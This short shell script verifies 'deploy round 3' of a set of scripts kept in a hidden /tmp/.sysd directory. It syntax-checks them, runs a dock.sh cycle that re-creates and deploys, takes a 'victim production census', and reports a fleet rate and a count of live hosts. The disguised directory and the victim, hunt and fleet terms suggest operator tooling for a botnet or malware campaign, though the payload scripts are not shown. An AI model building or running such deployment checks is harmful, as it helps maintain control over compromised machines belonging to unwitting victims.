#!/bin/sh
# throwaway: deploy round 3 + verify the fall-through fix actually lands config.
set -u
S=/tmp/.sysd
for f in dock.sh dockhot.sh pool.sh; do
    sh -n "$S/$f" 2>/dev/null && echo "SYNTAX_OK $f" || echo "SYNTAXFAIL $f"
done
echo "== dock.sh cycle (re-creates should now COMPLETE, not just be logged)"
sh "$S/dock.sh" 2>&1 | grep -E 're-creating|replaced|rungs failed|DEPLOYED|dock: live|dock: scanned' | tail -22
echo "== victim production census"
sh "$S/victim.sh" 2>&1 | tail -3
echo "== pool instrument"
sh "$S/pool.sh" log 2>&1 | tail -5
echo "== rate"
cat "$S/.hunt/fleet.rate" 2>/dev/null
echo "== live set"
sort -u "$S/.hunt/dock.live" | wc -l
date -u
